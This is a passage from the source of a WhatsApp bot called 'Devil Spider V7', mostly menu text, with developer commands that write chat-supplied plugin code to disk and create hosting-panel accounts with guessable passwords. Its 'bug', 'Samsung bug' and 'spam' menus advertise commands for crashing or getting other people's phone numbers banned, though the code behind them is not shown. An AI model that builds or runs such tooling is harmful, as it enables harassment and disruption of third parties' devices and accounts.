┃✫ ipay amount
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
   \`𝗦𝗔𝗠𝗦𝗨𝗠𝗚 𝗕𝗨𝗚𝗦\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ samsung_cl 254##
┃✫ classx 254##
┃✫ castx 254##
┃✫ carsmsg amount
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: oami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
  case 'bug2': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let kami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉               
 \`𝗔𝗡𝗗𝗥𝗢 & 𝗜𝗢𝗦\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉    
┃✫ ext-3 254 ##
┃✫ paym 254##
┃✫ listeresp 254##
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
         \`𝗜𝗠𝗠𝗨𝗡𝗘\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉    
┃✫ matta-immn
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: kami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
case 'gcmenu': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let ami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
     \`𝙂𝘾 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ editsubjek
┃✫ editdesk
┃✫ setppgroup
┃✫ setppgc
┃✫ linkgc
┃✫ resetlinkgc
┃✫ revoke
┃✫ kick
┃✫ add
┃✫ promote
┃✫ demote
┃✫ hidetag
┃✫ tagall
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: ami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
  case 'othermenu': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let nami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉               
       \`𝙊𝙏𝙃𝙀𝙍\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ sticker
┃✫ toimg
┃✫ ttp text|pix
┃✫ tts text|lang
┃✫ smeme text1|text2
┃✫ textmaker text1|text2
┃✫ tesc text
┃✫ tocc text
┃✫ stt text
┃✫ attp text
┃✫ toascii text
┃✫ qrcode text
┃✫ barcode text
┃✫ shorturl link
┃✫ removebg reply img
┃✫ remini reply img
┃✫ calculator
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: nami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
case 'downloadmenu': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let jami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
     \`𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙎\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ igdl url
┃✫ mediafire url
┃✫ ytmp3 url
┃✫ ytmp4 url
┃✫ gitclone url
┃✫ tiktok url
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`

tdx.sendMessage(m.chat, { 
	           text: jami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
   case 'searchmenu': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let xami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉              
    \`𝗦𝙀𝘼𝙍𝘾𝙃\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ pint query
┃✫ play query
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: xami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
case 'aimenu': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let pami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
 \`𝘼𝙄 𝙈𝙀𝙉𝙐\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  
┃✫ rimuru-ai query
┃✫ trash-ai query
┃✫ ai query
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
        \`𝙑𝘾𝙁\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉   
┃✫ pushkontak teks
┃✫ jpm
┃✫ jpm2
┃✫ jpmht
┃✫ jpmht2
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: pami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
               
 case 'spammenu': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let lami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉        
    \`𝗦𝗣𝗔𝗠\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  
┃✫ spam-pair 2543###
┃✫ temp-ban 254##
┃✫ oto$
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: lami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
 case 'bug1': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let ssami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
   \`𝗕𝗨𝗚 𝗠𝗘𝗡𝗨\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  
┃✫ galaxy 254##
┃✫ rickast 254##
┃✫ radiob 254##
┃✫ cards 254##
┃✫ dropd 254##
┃✫ flowto 254##
┃✫ 1st 254##
┃✫ blobx 254##
┃✫ screen_0 254##
┃✫ dott
┃✫ breaak
┃✫ csx amount
┃✫ rickr amount
┃✫ call amount
┃✫ 🔥 amount
┃✫ 🏴‍☠️ amount
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: ssami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
case 'public': {
if (!isDeveloper) return
tdx.public = true
await reaction(m.chat, "✅")
}
break
case 'self': {
if (!isDeveloper) return
tdx.public = false
await reaction(m.chat, "✅")
}
break
case 'addplug': {
if (!isDeveloper) return
await reaction(m.chat, "🔁")
if (!q.includes("|")) return xreply(`Add input, Example: \n\n*.plugin name|category|content*`)
const [
pluginName,
category, ...pluginContent
] = q.split("|")
const pluginDirPath = path.join(path.resolve(__dirname, './plugin', category))
const pluginFilePath = path.join(pluginDirPath, pluginName + ".js")
if (!q.includes("|") || pluginContent.length === 0 || fs.existsSync(pluginFilePath)) return
if (!fs.existsSync(pluginDirPath)) fs.mkdirSync(pluginDirPath, {
recursive: true
})
fs.writeFileSync(pluginFilePath, pluginContent.join('|'))
await xreply(`Plugin baru telah dibuat di ${pluginFilePath}.`)
await reaction(m.chat, "✅")
}
break
//=================================================//
case 'cgplug': {
if (!isDeveloper) return
await reaction(m.chat, "🔁")
if (!q.includes("|")) return xreply(`Add Input, Example: *.cgplug thisplug|newcontent*`)
let [mypler, ...rest] = q.split("|")
let mypenis = rest.join("|")
let pluginsDirect = path.resolve(__dirname, './plugin')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(mypler)) {
let filePath = plugin.filePath
fs.writeFileSync(filePath, mypenis)
await xreply(`Plugin di ${filePath} telah diganti`)
return
}
}
await xreply(`Plugin dengan command '${mypler}' tidak ditemukan`)
await reaction(m.chat, "✅")
}
break
//=================================================//
case 'rmplug': {
if (!isDeveloper) return
await reaction(m.chat, "🔁")
if (!q) return xreply(`Please provide the command name of the plugin you want to remove. Example: \n\n*.rmplug thisplug*`)
let pluginsDirect = path.resolve(__dirname, './plugin')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(q)) {
let filePath = plugin.filePath
fs.unlinkSync(filePath)
await xreply(`Plugin di ${filePath} telah dihapus.`)
return
}
}
await xreply(`Plugin dengan command '${q}' tidak ditemukan.`)
await reaction(m.chat, "✅")
}
break
//=================================================//
case 'getplug': {
if (!isDeveloper) return
await reaction(m.chat, "🔁")
if (!q) return xreply(`Add Input, Example: \n\n*.getplug ryocakep*`)
let pluginsDirect = path.resolve(__dirname, './plugin')
let plugin = loadPlugins(pluginsDirect).find(p => p.command.includes(q))
if (!plugin) return xreply(`Plugin dengan command '${q}' tidak ditemukan.`)
await tdx.sendMessage(m.chat, {
document: fs.readFileSync(plugin.filePath),
fileName: path.basename(plugin.filePath),
mimetype: '*/*'
}, {
quoted: m
})
await xreply(`Succes mengambil plugin '${q}', plugin telah dikirim.`)
await reaction(m.chat, "✅")
}
break
//=================================================//
//.      Malasz, Sakit kepala


/*case 'delcase': {
if (!isDeveloper) return
if (!q) return xreply(`Add Input, Example: \n\n*.delcase ryocakep*`)
await reaction(m.chat, "🔁")
let filePath = path.resolve(__filename)
let fileContent = fs.readFileSync(filePath, "utf-8")
let startIndex = fileContent.indexOf(`case '${q}'`)
let endIndex = fileContent.indexOf("break", startIndex)
if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 5)
fileContent = fileContent.replace(caseToDelete, "")
fs.writeFileSync(filePath, fileContent, "utf-8")
await reaction(m.chat, "✅")
await xreply(`Case '${q}' Has Been Removed From ${filePath}`)
} else {
await xreply(`gada kontol`)
}
}
break
//=================================================//
case 'addcase': {
if (!isDeveloper) return
if (!q.includes("|")) return xreply(`Add input, Example: \n\n*.addcase case|loc*\n\nAdd a new case under the specified location.`)
await reaction(m.chat, "🔁")
let [newCase, loc] = q.split("|").map(item => item.trim())
let filePath = path.resolve(__filename)
let fileContent = fs.readFileSync(filePath, "utf-8")
let breakIndex = fileContent.indexOf(`break\n`, fileContent.indexOf(`case '${loc}':`))
if (breakIndex !== -1) {
fileContent = fileContent.slice(0, breakIndex + 6) + `\n  ${newCase}\n` + fileContent.slice(breakIndex + 6)
fs.writeFileSync(filePath, fileContent, "utf-8")
await reaction(m.chat, "✅")
await xreply(`New case '${newCase}' successfully added below case '${loc}'!`)
} else {
await xreply(`Case "${loc}" not found or "break" not properly formatted.\n   gajelas kontol`)
}
}
break*/
case 'delowner':{
if (!isDeveloper) return 
if (!q) return  xreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g,"")
if (bijipler.startsWith('0')) return  xreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let index = kontributor.indexOf(bijipler)
if (index>-1){
kontributor.splice(index,1)
fs.writeFileSync(path.resolve(__dirname,'../trashbase/dtbs/owner.json'),JSON.stringify(kontributor),'utf8')
xreply("Owner berhasil dihapus")
} else {
xreply("Nomor tidak ditemukan dalam daftar owner")
}
}
break
//=================================================//
case 'delprem':{
if (!isDeveloper) return 
if (!q) return  xreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g,"")
if (bijipler.startsWith('0')) return  xreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let index = itsOrkay.indexOf(bijipler)
if (index>-1){
itsOrkay.splice(index,1)
fs.writeFileSync(path.resolve(__dirname,'../trashbase/dtbs/premium.json'),JSON.stringify(itsOrkay),'utf8')
xreply("Pengguna premium berhasil dihapus")
} else {
xreply("Nomor tidak ditemukan dalam daftar pengguna premium")
}
}
break
//=================================================//
case 'addowner': {
if (!isDeveloper) return
if (!q) return xreply(`Penggunaan .${command} 6287392784527`);
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return xreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let add = bijipler + '@s.whatsapp.net'


let capt = `
Anda kini telah mendapatkan akses owner ke bot
`


kontributor.push(bijipler)
fs.writeFileSync(path.resolve(__dirname, '../trashbase/dtbs/owner.json'), JSON.stringify(kontributor), 'utf8')
xreply("Berhasil menambahkan ke daftar owner")
await sleep(5000)
await tdx.sendMessage(add, {
contextInfo: {
mentionedJid: [add],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `# Addprem - `+add,
previewType: "VIDEO",
sourceUrl: `${global.url}`,
mediaUrl: `${global.url}`
}
},
text: capt
}, {
quoted: m
})
}
break
//=================================================//
case 'addprem': {
if (!isDeveloper) return
if (!q) return xreply(`Penggunaan .${command} 6287392784527`);
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return xreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let add = bijipler + '@s.whatsapp.net'


let capt = `
Anda kini telah mendapatkan akses premium ke bot
`

itsOrkay.push(bijipler)
fs.writeFileSync(path.resolve(__dirname, '../trashbase/dtbs/premium.json'), JSON.stringify(itsOrkay), 'utf8');
xreply("Berhasil menambahkan ke daftar premium")
await sleep(5000)
await tdx.sendMessage(add, {
contextInfo: {
mentionedJid: [add],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `# Addprem - `+add,
previewType: "VIDEO",
sourceUrl: `${global.url}`,
mediaUrl: `${global.url}`
}
},
text: capt
}, {
quoted: m
})
}
break
case "ping": {
  const startTime = new Date();
  const pingMsg = await tdx.sendMessage(m.chat, { text: '*sᵖᵉᵉᵈ*' });

 await tdx.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `𝑺𝒑𝒊𝒅𝒆𝒓 𝑳𝒂𝒔𝒕 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 𝑺𝒑𝒆𝒆𝒅 ➟ *${new Date() - startTime}* ᴍs `
        }
      }
    }, {});
  } 
break
	case "runtime":
                let pinga = ` รρเ∂εɾ ѵ7 ɦαร ɓεεɳ αcƭเѵε ƒσɾ ${runtime(process.uptime())}`
               tdx.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `sᵖⁱᵈᵉʳ ᴠ7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: 'https://telegra.ph/file/b127513eb930ee73178dd.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
 //================================================//
   case "addsrv": {
if (!isDeveloper) return xreply(`You are not my owner`)
let s = text.split(',');
if (s.length < 7) return reply(`> *Incorrect format!*

❗ Usage:
${prefix + command} panel name, date, user ID you want to add the server to, eggId, locationId, memory/disk, cpu

\`✅ Example\` : addsrv Spider,26 December 2018,1,15,1,0/0,0
`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name + ' King-Sam',
"description": 'Created by ' + namabot,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
xreply(`
❗ *SUCCESSFULLY ADD SERVER*

TYPE: \`${res.object}\`

ID: \`${server.id}\`
UUID: ${server.uuid}\`
NAME: ${server.name}\`
DESCRIPTION: \`${server.description}\`
MEMORY: \`${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\`
DISK: \`${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\`
CPU: \`${server.limits.cpu}%\`
CREATED AT: ${server.created_at}\``)
}
break
case 'unli': {
if (!isDeveloper) return xreply(`You cannot get a panel because u are not my owner gay 💀`)
let t = text.split(',');
if (t.length < 2) return reply(`use:\n${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "kingsam@sweetrabit.ml"
akunlo = "https://telegra.ph/file/3879ada0f622f5843b662.jpg" 
if (!u) return
let d = (await tdx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return xreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
xreply(`User ID: ${user.id}`)
let ctf = `❗Hello @${m.sender.split('@')[0]} , 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 Just Gave You Access To The Following Account Panel > >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
tdx.sendMessage(u, { image: { url: 'https://telegra.ph/file/7f1e9da89011736a82473.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - Unlimited',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await xreply(`Succeful added user and server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '2gb': {
if(!isDeveloper){
reply(`You are not my owner`)
}
if (!isDeveloper) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
